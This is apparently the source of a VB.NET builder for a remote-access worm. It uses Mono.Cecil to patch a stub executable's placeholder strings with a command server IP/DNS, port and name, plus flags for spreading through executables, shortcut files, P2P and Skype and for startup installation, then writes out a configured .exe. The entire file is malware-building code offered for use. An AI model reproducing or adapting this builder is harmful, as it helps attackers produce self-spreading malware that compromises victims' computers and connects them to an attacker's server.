Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Form1
    Public STUB As String
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim ofd As New OpenFileDialog
        With ofd
            .Filter = "STUB (.exe)|*.exe"
            If (.ShowDialog = DialogResult.OK) Then
                STUB = .FileName
            Else
                Exit Sub
            End If
        End With
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim asm As AssemblyDefinition = AssemblyDefinition.ReadAssembly(STUB)
        Dim tdf As TypeDefinition
        For Each tdf In asm.MainModule.GetTypes
            Dim mdf As MethodDefinition
            For Each mdf In tdf.Methods
                If (mdf.Name = ".cctor") Then
                    Dim enm As IEnumerator(Of Instruction) = Nothing
                    Try
                        enm = mdf.Body.Instructions.GetEnumerator
                        Do While enm.MoveNext
                            Dim current As Instruction = enm.Current
                            If (current.OpCode.Code = Code.Ldstr) Then
                                Dim strings As String = current.Operand.ToString
                                If (strings = "[IP/DNS]") Then current.Operand = TextBox1.Text
                                If (strings = "[Port]") Then current.Operand = TextBox2.Text
                                If (strings = "[Name]") Then current.Operand = TextBox3.Text
                                If (strings = "[SpreadExe]") Then current.Operand = CheckBox1.Checked.ToString
                                If (strings = "[Spreadlnk]") Then current.Operand = CheckBox2.Checked.ToString
                                If (strings = "[SpreadP2P]") Then current.Operand = CheckBox3.Checked.ToString
                                If (strings = "[SpreadSkype]") Then current.Operand = CheckBox4.Checked.ToString
                                If (strings = "[SI]") Then current.Operand = CheckBox5.Checked.ToString
                            End If
                        Loop
                    Finally
                        enm.Dispose()
                    End Try
                End If
            Next
        Next

        Dim sfd As New SaveFileDialog
        With sfd
            .Filter = "(.exe) |*.exe"
            .FileName = TextBox4.Text
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                asm.Write(.FileName)
                MsgBox("Server Informations Done", vbInformation)
            End If
        End With

    End Sub
End Class
